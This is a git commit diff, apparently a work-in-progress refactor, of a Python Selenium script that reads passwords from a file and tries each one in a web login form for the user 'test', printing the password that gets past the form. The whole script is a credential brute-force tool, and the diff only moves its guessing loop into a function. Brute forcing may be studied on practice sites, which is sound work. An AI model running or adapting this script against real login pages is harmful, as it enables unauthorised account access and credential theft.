3fe4b9a52689fd07c5a9a8eac99b166b669b61e8
gromkoviec <pankrzysztof@o2.pl>
2022-05-04 21:08:05 +0200

    refactor in progress

--- maine.py
+++ maine.py
@@ -17,36 +17,24 @@ def read_list_from_file(filename):
     file_handler.close()
     return read_list
 
-"""Osługa strony"""
-
-cssclick = "#content > div:nth-child(1) > form > table > tbody > tr:nth-child(3) > td > input[type=submit]"
-
-def parameters(self, user_space, password_space):
-    uname = user_space
-    pass = password_space
-
-    return user_space, password_space
-
-
 """Dane logowania"""
 
 user_used = "test"
 password_from_list = read_list_from_file("passw")
+cssclick = "#content > div:nth-child(1) > form > table > tbody > tr:nth-child(3) > td > input[type=submit]"
 
-
-
-for password in password_from_list:
 #"""Nazwa na stronie z CSS"""
-    user_space = "uname"
-    password_space = "pass"
 
-    driver.find_element(by=By.NAME, value= user_space).send_keys(user_used)
-    driver.find_element(by=By.NAME, value= password_space).send_keys(password)
-    driver.find_element(by=By.CSS_SELECTOR, value=cssclick).click()
-    try: #obsługa błedów
-        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.NAME, user_space)))
-    except:
-        print("Correct password is ==> " + password + " <==")
+def loggin(user_space, password_space, cssclick):
+    for password in password_from_list:
+
+        driver.find_element(by=By.NAME, value= user_space).send_keys(user_used)
+        driver.find_element(by=By.NAME, value= password_space).send_keys(password)
+        driver.find_element(by=By.CSS_SELECTOR, value=cssclick).click()
+        try: #obsługa błedów
+            WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.NAME, user_space)))
+        except:
+            print("Correct password is ==> " + password + " <==")
 
 
 
